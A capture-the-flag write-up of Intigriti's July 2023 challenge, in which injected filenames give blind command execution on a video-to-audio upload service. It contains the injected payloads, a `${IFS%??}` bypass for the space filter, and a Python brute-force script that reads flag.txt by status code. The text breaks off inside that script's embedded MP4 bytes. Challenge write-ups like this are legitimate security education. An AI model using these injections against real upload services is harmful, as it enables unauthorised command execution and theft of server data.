# Writeup for Intigriti's July 2023 challenge

### tl;dr

* Remote code execution via the name of an uploaded file
* Not all characters were allowed in the file name, e.g. no spaces and slashes. To replace spaces a bash specific variable was used. 
* No back channel, so it was only possible to determine whether the command was executed successfully by looking at the status code. 
* The file with the flag (flag.txt) was in the parent directory of the current working directory. 


### Detailed Writeup: 

#### Exploration: 

When you visit the challenge website [https://challenge-0723.intigriti.io/](https://challenge-0723.intigriti.io/) for the first time, there are only a few descriptions that shed some light at the purpose of the website. It is stated that the webapp is an audio video extractor that extracts the audio track from a video. There is also an upload button that takes you to an upload form. 

First, I took a closer look at the client-side HTML code. This time there was no client-side Javascript code included, so it strongly appeared that the bug to be exploited existed on the server side. 

After that I started to play around with the upload functionality. I chose a sample mp4 file which I then uploaded via the HTML form. To upload the mp4 file the following POST request was sent: 

```
POST /upload HTTP/2
Host: challenge-0723.intigriti.io
Content-Length: 4882
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://challenge-0723.intigriti.io
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVe8B2hOjY4mvCW76
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://challenge-0723.intigriti.io/upload
Accept-Encoding: gzip, deflate

------WebKitFormBoundaryVe8B2hOjY4mvCW76
Content-Disposition: form-data; name="video"; filename="testfile.mp4"
Content-Type: video/mp4

<CONTENT OF THE MP4 FILE>

------WebKitFormBoundaryVe8B2hOjY4mvCW76--
```
The corresponding response contained a generated wav audio file. So there are two pieces of data that the attacker controls: The filename and the content of the uploaded mp4 file. 

The first idea that came to my mind was that there might be a vulnerability in the server-side conversion funtionality of mp4 files. So I googled which program/libraries are usually used to convert mp4 to audio files and came across the binary `ffmpeg`. I searched for possible known CVEs but there was nothing applicable. 

Then I took a look at the filename and noticed that specific bash characters led to a `500 internal server error` status in the response. More precisely, I tested the following string: `xx;id#.mp4`. Perhaps the filename is processed on the server side so that it is added to a string at a certain point, which in turn contains a bash shell command that is subsequently executed. For example, when we assume that ffmpeg is used the string would look as follows: 

```
bash_cmd = "ffmpeg -i " + uploaded_filename + " -ac 2 -f wav extracted_audio.wav"
```

If I insert my chosen filename unvalidated, the following string would be generated: 

```bash
ffmpeg -i xx;id#.mp4 -ac 2 -f wav extracted_audio.wav
```

The first semicolon would terminate the first ffmpeg command and introduce the second `id` command to be executed. The hash is used to comment out everything that comes after it. After uploading this file, I received the status `200 OK` as a response, so I knew that it must be vulnerable to remote code execution. However, we do not have a return channel so this is a blind RCE vulnerability. 

#### Finding the flag:

Now that I knew I could run my on commands on the server, I first try to find out what Linux binaries are available. So I uploaded several files: 

* `xx;ls#.mp4` - Status: 200, ls is present
* `xx;cd#.mp4` - Status: 200, cd is present
* `xx;cat#.mp4` - Status: 200, cat is present
* `xx;grep#.mp4` - Status: 200, grep is present
* `xx;dig#.mp4` - Status: 500, dig is not present
* `xx;curl#.mp4` - Status: 500, curl is not present
* `xx;wget#.mp4` - Status: 500, wget is not present
* `xx;nc#.mp4` - Status: 500, nc is not present
* `xx;python#.mp4` - Status: 200, python is present, interesting
* etc...

At this point I had enough tools to start searching for the flag. I played a little with Python at first, but found that some characters such as `/` seemed to be forbidden by the shell. So there must be some kind of restricted shell. For me a payload containing Python code was a bit long and too cumbersome, so I decided to search the flag with Linux onboard tools.

I made the assumption that the flag must exist in a file, possibly called something like `flag.txt`. To see if this file was in the current directory, I had to run the following command: `ls flag.txt`. However, I had the problem that no spaces were allowed in the file by the web application. Fortunately, there are some workarounds in Linux, such as the following variable: `$IFS`. The IFS variable is an acronym for Internal Field Separator or Input Field Separator. The default value is `<space><tab><newline>`, but I only needed a space, so I used to following variant: `${IFS%??}`. I sent the following filename and got back a `500 internal server error` status code: 

```
xx;ls${IFS%??}flag.txt;#.mp4
```

Because of this status code I knew that this file is not present in the current working directory. Then, my approach was to use the binary `cd` to stepwise move up one directory from working directory towards the root directory and to check if the file exists there using the binary `ls`. The payload looked as follows: 

```
xx;${IFS%??}cd${IFS%??}..${IFS%??}&&${IFS%??}ls${IFS%??}flag.txt;#.mp4
```
This filename corresponds to the follwoing command: 

```
cd .. && ls flag.txt
```
This time I got a `200 OK` status code, so apparently I guessed right and found the file with the flag. Next, I had to find a way to read the contents of the file and exfiltrate it character by character, as we want to exploit a blind RCE vulnerability. 

As the format of the flag was already known (`INTIGRITI{.*}`), I checked that the flag.txt file really contains the right content. For that I used the binary `grep` and ran the command below: 

```
cd .. && grep "INTIGRITI{" flag.txt 
```
The corresponding filename looked as follows: 

```
xx;${IFS%??}cd${IFS%??}..${IFS%??}&&${IFS%??}grep${IFS%??}${IFS%??}\"INTIGRITI{\"${IFS%??}flag.txt;#.mp4
```

I got back a status code 200, which confirmed my assumtion that the file contains the flag. Now I was able to guess the content of the flag by bruteforcing each alphanumeric character and looking for a 200 status afterwards. To be more precise, the approach was as follows:

```
INTIGRITI{}
INTIGRITI{0
INTIGRITI{1
INTIGRITI{2
...
...
INTIGRITI{9
INTIGRITI{a
INTIGRITI{b
INTIGRITI{c --> status 200 so we know that this is the right char
INTIGRITI{c}
INTIGRITI{c0 --> status 200 again
INTIGRITI{c00
INTIGRITI{c01
INTIGRITI{c02
...
...
...
```
Each line corresponds to one HTTP Request and a execution of the command shown before with a modified flag. As this task can be easly automated, I wrote the following python-script: 

```
#!/usr/bin/env python3

import requests
import string

def sendRequest(inputstr):
		
		print("Currently trying: INTIGRITI{" + inputstr)
        
		data = '------WebKitFormBoundaryVe8B2hOjY4mvCW76\r\nContent-Disposition: form-data; name="video"; filename="xx;${IFS%??}cd${IFS%??}..&&${IFS%??}cd${IFS%??}..&&cd${IFS%??}..&&cd${IFS%??}..&&${IFS%??}grep${IFS%??}${IFS%??}\\"INTIGRITI{' + inputstr + '\\"${IFS%??}flag.txt;#.mp4"\r\nContent-Type: video/mp4\r\n\r\n\x00\x00\x00 ftypisom\x00\x00\x02\x00isomiso2avc1mp41\x00\x00D\x80moov\x00\x00\x00lmvhd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03è\x00\x00xP\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x1eUtrak\x00\x00\x00\\tkhd\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00xP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x01@\x00\x00\x00ð\x00\x00\x00\x00\x00$edts\x00\x00\x00\x1celst\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00xP\x00\x00\b\x00\x00\x01\x00\x00\x00\x00\x1dÍmdia\x00\x00\x00 mdhd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<\x00\x00\a8\x00UÄ\x00\x00\x00\x00\x00-hdlr\x00\x00\x00\x00\x00\x00\x00\x00vide\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00VideoHandler\x00\x00\x00\x1dxminf\x00\x00\x00\x14vmhd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$dinf\x00\x00\x00\x1cdref\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\furl \x00\x00\x00\x01\x00\x00\x1d8stbl\x00\x00\x00¨stsd\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x98avc1\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01@\x00ð\x00H\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18ÿÿ\x00\x00\x002avcC\x01d\x00\fÿá\x00\x19gd\x00\f¬ÙAAû\x01\x10\x00\x00\x03\x00\x10\x00\x00\x03\x01àñB\x99`\x01\x00\x06hêàA,\x8b\x00\x00\x00\x10pasp\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x18stts\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01Î\x00\x00\x04\x00\x00\x00\x000stss\x00\x00\x00\x00\x00\x00\x00\b\x00\x00\x00\x01\x00\x00\x00\x7f\x00\x00\x00Ä\x00\x00\x00ò\x00\x00\x01G\x00\x00\x01c\x00\x00\x01\x83\x00\x00\x01£\x00\x00\r\x88ctts\x00\x00\x00\x00\x00\x00\x01¯\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x03\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x03\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x02\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\x14\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\f\x00\x00\x00\x00\x01\x00\x00\x04\x00\x00\x00\x00\x01\x00\x00\b\x00\x00\x00\x00(stsc\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x0